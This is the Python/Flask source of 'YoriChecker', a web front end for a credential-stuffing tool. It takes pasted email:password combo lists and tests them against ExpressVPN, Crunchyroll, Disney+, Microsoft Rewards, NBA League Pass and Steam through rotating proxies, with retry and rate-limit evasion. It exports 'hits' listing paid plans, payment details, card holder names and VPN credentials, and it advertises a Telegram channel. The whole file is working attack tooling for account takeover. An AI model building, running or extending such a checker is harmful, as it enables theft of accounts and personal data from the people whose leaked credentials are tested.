import os
import io
import json
import time
import uuid
import threading
import requests
from flask import Flask, request, render_template_string, send_file, Response
from concurrent.futures import ThreadPoolExecutor, as_completed
import checker

app = Flask(__name__)

tasks = {}
task_lock = threading.Lock()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker // Unified</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        * { box-sizing: border-box; }
        body {
            background: #111; color: #eee; font-family: 'Space Mono', monospace;
            margin: 0; padding: 20px; min-height: 100vh; perspective: 1000px;
        }
        .container { 
            max-width: 1100px; margin: 0 auto; width: 100%;
            transition: transform 0.1s ease-out; transform-style: preserve-3d;
        }
        .site-header {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 20px; margin-bottom: 30px; padding-bottom: 20px;
            border-bottom: 4px solid #ff5500;
        }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .site-logo {
            width: 70px; height: 70px; object-fit: contain; border: 3px solid #ff5500;
            box-shadow: 5px 5px 0px #000; background: #222; padding: 5px;
        }
        h1 {
            text-transform: uppercase; letter-spacing: 2px; text-shadow: 4px 4px 0px #000;
            margin: 0; color: #ff5500; font-size: 28px;
        }
        .header-right { display: flex; flex-direction: column; align-items: flex-end; gap: 8px; }
        .btn-telegram {
            background: #0088cc; color: #fff; border: 2px solid #000; padding: 10px 20px;
            font-size: 14px; font-weight: bold; text-transform: uppercase; text-decoration: none;
            box-shadow: 4px 4px 0px #000; transition: transform 0.1s, box-shadow 0.1s;
            font-family: 'Space Mono', monospace; text-align: center; display: inline-block;
        }
        .btn-telegram:hover { transform: translate(2px, 2px); box-shadow: 2px 2px 0px #000; }
        .btn-telegram:active { transform: translate(4px, 4px); box-shadow: 0px 0px 0px #000; }
        .made-by {
            color: #888; font-size: 12px; text-decoration: none;
            font-family: 'Space Mono', monospace; transition: color 0.2s;
        }
        .made-by:hover { color: #00ffaa; }
        .service-select {
            width: 100%; padding: 15px; background: #222; color: #00ffaa;
            border: 3px solid #444; box-shadow: 8px 8px 0px #000;
            font-family: 'Space Mono', monospace; font-size: 16px; font-weight: bold;
            text-transform: uppercase; margin-bottom: 10px; cursor: pointer;
            appearance: none; -webkit-appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ffaa" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
            background-repeat: no-repeat; background-position: right 15px top 50%;
        }
        .service-desc {
            color: #888; font-size: 13px; margin-bottom: 20px; padding: 10px;
            background: #1a1a1a; border-left: 3px solid #ff5500;
        }
        .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .panel {
            flex: 1 1 100%; max-width: 100%; background: #222; border: 3px solid #444;
            box-shadow: 10px 10px 0px #000; padding: 15px;
        }
        .panel h3 {
            margin-top: 0; border-bottom: 2px solid #555; padding-bottom: 5px;
            text-transform: uppercase; color: #00ffaa;
        }
        textarea {
            width: 100%; height: 150px; background: #000; color: #00ffaa;
            border: 2px solid #555; padding: 10px; font-family: 'Space Mono', monospace;
            box-shadow: inset 4px 4px 0px #111; resize: vertical;
        }
        input[type="file"] {
            margin-top: 10px; color: #ccc; display: block;
            font-family: 'Space Mono', monospace; width: 100%;
        }
        .btn {
            background: #ff5500; color: #000; border: 3px solid #000; padding: 15px 30px;
            font-size: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer;
            box-shadow: 8px 8px 0px #000; transition: transform 0.1s, box-shadow 0.1s;
            font-family: 'Space Mono', monospace; width: 100%; margin-top: 20px;
        }
        .btn:hover { transform: translate(2px, 2px); box-shadow: 6px 6px 0px #000; }
        .btn:active { transform: translate(8px, 8px); box-shadow: 0px 0px 0px #000; }
        .btn:disabled {
            background: #555; color: #888; cursor: not-allowed;
            box-shadow: 8px 8px 0px #000; transform: none;
        }
        #logArea {
            background: #000; border: 3px solid #444; box-shadow: 10px 10px 0px #000;
            height: 300px; overflow-y: scroll; padding: 15px; font-size: 13px;
            color: #00ffaa; white-space: pre-wrap; margin-top: 20px;
            font-family: 'Space Mono', monospace; word-break: break-all;
        }
        #downloadBtn { display: none; background: #00ffaa; color: #000; }
        @media (max-width: 600px) {
            body { padding: 10px; perspective: none; }
            .site-header { flex-direction: column; align-items: flex-start; gap: 15px; }
            .header-right { width: 100%; align-items: flex-start; flex-direction: row; justify-content: space-between; }
            h1 { font-size: 22px; }
            .site-logo { width: 50px; height: 50px; }
            .btn { font-size: 16px; padding: 12px 20px; }
            .panel { box-shadow: 6px 6px 0px #000; }
            #logArea { box-shadow: 6px 6px 0px #000; height: 250px; font-size: 12px; }
            .container { transform: none !important; }
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <header class="site-header">
            <div class="header-left">
                <img src="/logo.png" alt="YoriChecker Logo" class="site-logo" onerror="this.style.display='none'">
                <h1>YoriChecker</h1>
            </div>
            <div class="header-right">
                <a href="https://t.me/+y8EekRvqpnQzNjZl" target="_blank" class="btn-telegram">JOIN CHANNEL</a>
                <a href="https://t.me/WhoEvenYori" target="_blank" class="made-by">Made by @WhoEvenYori</a>
            </div>
        </header>
        
        <select id="service" class="service-select" onchange="updateDesc()">
            <option value="expressvpn">🌐 ExpressVPN</option>
            <option value="crunchyroll" selected>🍿 Crunchyroll</option>
            <option value="disney">🏰 Disney+</option>
            <option value="microsoft">🎮 Microsoft Rewards</option>
            <option value="nba">🏀 NBA League Pass</option>
            <option value="steam">🎮 Steam</option>
        </select>
        <div class="service-desc" id="serviceDesc">Checks Crunchyroll accounts using email:pass combos.</div>

        <div class="panels">
            <div class="panel">
                <h3>Accounts (email:pass)</h3>
                <textarea id="accounts_text" placeholder="email:pass (max 50)"></textarea>
                <input type="file" id="accounts_file" accept=".txt" onchange="loadFile(this, 'accounts_text')">
            </div>
        </div>
        
        <button class="btn" id="startBtn" disabled onclick="startChecking()">START CHECKING</button>
        <div id="logArea">[System] Awaiting input...</div>
        <button class="btn" id="downloadBtn">DOWNLOAD RESULTS</button>
    </div>

    <script>
        const descMap = {
            'expressvpn': 'Checks ExpressVPN accounts using email:pass combos. Returns plan, expiry, OVPN/PPTP creds.',
            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.',
            'disney': 'Checks Disney+ accounts using email:pass combos. Returns plan, status, profiles, Hulu status.',
            'microsoft': 'Checks Microsoft Rewards accounts using email:pass. Returns balance, subscriptions, points.',
            'nba': 'Checks NBA League Pass accounts using email:pass. Returns display name, expiry, country.',
            'steam': 'Checks Steam accounts using email:pass. Returns games, level, VAC bans, notable titles.'
        };

        function updateDesc() {
            const svc = document.getElementById('service').value;
            document.getElementById('serviceDesc').textContent = descMap[svc] || '';
        }

        let accountsLoaded = false;

        function loadFile(input, textareaId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                const textarea = document.getElementById(textareaId);
                textarea.value = textarea.value ? textarea.value + '\\n' + e.target.result : e.target.result;
                updateStartButton();
            };
            reader.readAsText(file);
        }

        function updateStartButton() {
            accountsLoaded = document.getElementById('accounts_text').value.trim().length > 0;
            document.getElementById('startBtn').disabled = !accountsLoaded;
        }

        document.getElementById('accounts_text').addEventListener('input', updateStartButton);

        async function processStream(url, payload, onMessage) {
            const response = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            const reader = response.body.getReader();
            const decoder = new TextDecoder();
            let buffer = '';
            while(true) {
                const {done, value} = await reader.read();
                if(done) break;
                buffer += decoder.decode(value, {stream: true});
                const lines = buffer.split('\\n');
                buffer = lines.pop();
                for(const line of lines) {
                    if(line.startsWith('data: ')) {
                        try { onMessage(JSON.parse(line.substring(6))); } catch(e) {}
                    }
                }
            }
        }

        async function startChecking() {
            const fullAccounts = document.getElementById('accounts_text').value;
            const service = document.getElementById('service').value;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').textContent = 'PROCESSING...';
            document.getElementById('service').disabled = true;
            document.getElementById('logArea').innerHTML = '';
            
            await processStream('/check', {service: service, accounts: fullAccounts}, (data) => {
                if (data.log) {
                    document.getElementById('logArea').innerHTML += data.log + '\\n';
                    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
                } else if (data.event === 'done') {
                    document.getElementById('downloadBtn').style.display = 'block';
                    document.getElementById('downloadBtn').onclick = () => {
                        window.location.href = `/download/${data.task_id}`;
                    };
                    document.getElementById('startBtn').textContent = 'START CHECKING';
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('service').disabled = false;
                }
            });
        }

        const container = document.getElementById('mainContainer');
        if (window.innerWidth > 600) {
            document.addEventListener('mousemove', (e) => {
                const x = (window.innerWidth / 2 - e.pageX) / 80;
                const y = (window.innerHeight / 2 - e.pageY) / 80;
                const tiltX = Math.max(-5, Math.min(5, y));
                const tiltY = Math.max(-5, Math.min(5, -x));
                container.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
            });
            document.addEventListener('mouseleave', () => {
                container.style.transform = 'rotateX(0) rotateY(0)';
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/logo.png')
def logo():
    try:
        return send_file('logo.png', mimetype='image/png')
    except FileNotFoundError:
        return "Logo not found", 404

@app.route('/health')
def health():
    return "OK", 200

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    service = data.get('service', 'crunchyroll')
    accounts_raw = data.get('accounts', '')
    
    entries = []
    for line in accounts_raw.splitlines():
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                entries.append((parts[0], parts[1]))
                
    task_id = str(uuid.uuid4())
    
    results = []
    results_lock = threading.Lock()
    logs = []
    logs_lock = threading.Lock()
    
    def log(msg):
        with logs_lock:
            ts = time.strftime("%H:%M:%S")
            logs.append(f"[{ts}] {msg}")

    checker_map = {
        'expressvpn': checker.ExpressVPNChecker,
        'crunchyroll': checker.CrunchyrollChecker,
        'disney': checker.DisneyChecker,
        'microsoft': checker.MicrosoftRewardsChecker,
        'nba': checker.NBAChecker,
        'steam': checker.SteamChecker
    }
    
    CheckerClass = checker_map.get(service, checker.CrunchyrollChecker)

    def check_entry(email, password, proxy_manager):
        max_attempts = 3
        attempts = 0
        
        while attempts < max_attempts:
            proxy = proxy_manager.get_proxy()
            
            log(f"Checking {email} with proxy {proxy or 'DIRECT'}...")
            
            class SingleProxyMgr:
                def __init__(self, p): self.p = p
                def get_proxy(self): return self.p
                def mark_bad(self): pass
            
            mgr = SingleProxyMgr(proxy) if proxy else None
            chk = CheckerClass(mgr)
            res = chk.check_account(email, password)
            status = res.get('status', 'ERROR')
            
            if status == 'HIT':
                proxy_manager.report_success(proxy)
                log(f"{email} -> HIT!")
                return res
            elif status in ('INVALID', 'FREE', 'DEAD', 'BAD', 'EXPIRED', 'UNKNOWN', '2FA', 'BANNED', 'RESET'):
                proxy_manager.report_success(proxy)
                log(f"{email} -> BAD ({status})")
                res['status'] = 'BAD'
                res['error'] = status
                return res
            else:
                proxy_manager.report_rate(proxy, 60)
                log(f"Proxy {proxy or 'DIRECT'} hit RATE/ERROR ({status}). Cooldown 60s.")
                attempts += 1
                time.sleep(2)
                
        log(f"{email} -> RATE (max retries exhausted)")
        return {'email': email, 'password': password, 'status': 'RATE', 'data': {}, 'error': 'Max retries exhausted'}

    def run():
        if len(entries) > 50:
            extra = len(entries) - 50
            log(f"⚠️ Only first 50 combos will be checked (ignoring {extra} extra).")
            entries_to_check = entries[:50]
        else:
            entries_to_check = entries

        log("Fetching fresh proxies...")
        try:
            working_proxies = checker.get_working_proxies(min_count=15)
        except Exception as e:
            log(f"Proxy fetch failed: {str(e)[:50]}")
            working_proxies = []
            
        if len(working_proxies) < 5:
            log(f"❌ Not enough working proxies ({len(working_proxies)}). Aborting.")
            with task_lock:
                tasks[task_id] = (service, [])
            return
            
        log(f"✓ Found {len(working_proxies)} working proxies.")
        
        proxy_manager = checker.SmartProxyManager(working_proxies)

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(check_entry, e, p, proxy_manager): (e, p) for e, p in entries_to_check}
            for future in as_completed(futures):
                res = future.result()
                with results_lock:
                    results.append((futures[future], res))
        
        with task_lock:
            tasks[task_id] = (service, results)

    threading.Thread(target=run).start()
    
    def stream():
        last_log_idx = 0
        while True:
            with logs_lock:
                current_logs = list(logs)
            
            for i in range(last_log_idx, len(current_logs)):
                yield f"data: {json.dumps({'log': current_logs[i]})}\n\n"
            last_log_idx = len(current_logs)
            
            with task_lock:
                if task_id in tasks:
                    yield f"data: {json.dumps({'event': 'done', 'task_id': task_id})}\n\n"
                    break
            
            time.sleep(0.5)
            
    return Response(stream(), mimetype='text/event-stream')

@app.route('/download/<task_id>')
def download(task_id):
    with task_lock:
        task_data = tasks.get(task_id, (None, []))
        service, task_results = task_data
        
    hits = []
    bads = []
    rates = []

    def format_hit_line(svc, entry, res):
        d = res.get('data', res)
        identifier = f"{entry[0]}:{entry[1]}"

        if svc == 'expressvpn':
            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expire_date', 'N/A')} ({d.get('days_left', 0)}d) | Auto: {d.get('auto_renew', 'N/A')} | Pay: {d.get('payment_method', 'N/A')} | Lic: {d.get('license', 'N/A')} | OVPN: {d.get('ovpn_user', '')}:{d.get('ovpn_pass', '')} | PPTP: {d.get('pptp_user', '')}:{d.get('pptp_pass', '')}"
        elif svc == 'crunchyroll':
            return f"{identifier} | User: {d.get('user', 'N/A')} | Plan: {d.get('plan', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Renew: {d.get('renew', 'N/A')} | CC: {d.get('country', 'N/A')} | Pay: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}"
        elif svc == 'disney':
            profiles = ', '.join(d.get('profiles', []))
            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Status: {d.get('subscriber_status', 'N/A')} | CC: {d.get('country', 'N/A')} | Billing: {d.get('billing_cycle', 'N/A')} | Pay: {d.get('payment_provider', 'N/A')} | Expiry: {d.get('expiry', 'N/A')} ({d.get('remaining_days', 'N/A')}d) | Trial: {d.get('free_trial', 'N/A')} | Ver: {d.get('email_verified', 'N/A')} | Hulu: {d.get('hulu', 'N/A')} | Profiles: {profiles}"
        elif svc == 'microsoft':
            return f"{identifier} | CC: {d.get('country', 'N/A')} | Holder: {d.get('card_holder', 'N/A')} | Bal: {d.get('balance', 'N/A')} | Subs: {d.get('purchased_items', 'N/A')} | Auto: {d.get('auto_renew', 'N/A')} | Start: {d.get('start_date', 'N/A')} | Renew: {d.get('renewal_date', 'N/A')} | Pts: {d.get('points', 'N/A')}"
        elif svc == 'nba':
            return f"{identifier} | Name: {d.get('displayname', 'N/A')} | Expiry: {d.get('end_date', 'N/A')} | CC: {d.get('country', 'N/A')} | Renew: {d.get('renewal', 'N/A')}"
        elif svc == 'steam':
            notable = ', '.join([g['name'] for g in d.get('notable', [])])
            top10 = ', '.join([f"{g['name']}({g['playtime']}m)" for g in d.get('games_list', [])[:10]])
            return f"{identifier} | Persona: {d.get('persona', 'N/A')} | ID: {d.get('steamid', 'N/A')} | CC: {d.get('country', 'N/A')} | Lvl: {d.get('level', 'N/A')} | Games: {d.get('game_count', 'N/A')} | VAC: {d.get('vac_bans', 0)} | Trade: {d.get('trade_ban', 'N/A')} | Lim: {d.get('limited', 'N/A')} | Notable: {notable} | Top10: {top10}"
        return f"{identifier} | HIT"

    for entry, res in task_results:
        status = res.get('status')
        identifier = f"{entry[0]}:{entry[1]}"
        
        if status == 'HIT':
            hits.append(format_hit_line(service, entry, res))
        elif status == 'BAD':
            err = res.get('error') or res.get('reason') or 'Bad / Invalid / Free'
            bads.append(f"{identifier} | {err}")
        else:
            err = res.get('error') or res.get('reason') or 'Rate limit / Network Error'
            rates.append(f"{identifier} | {err}")

    sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    output = []
    output.append(sep)
    output.append("HITS (Active Paid Subscriptions)")
    output.append(sep)
    output.extend(hits)
    output.append("\n" + sep)
    output.append("BAD (Invalid / Free / Dead)")
    output.append(sep)
    output.extend(bads)
    output.append("\n" + sep)
    output.append("RATE (Rate Limits / Network Errors)")
    output.append(sep)
    output.extend(rates)
    output.append("\n" + sep)
    output.append(f"SUMMARY: TOTAL HITS: {len(hits)} | BAD: {len(bads)} | RATE: {len(rates)}")
    output.append(sep)

    mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
    return send_file(mem, as_attachment=True, download_name=f'YoriChecker_{service}.txt', mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
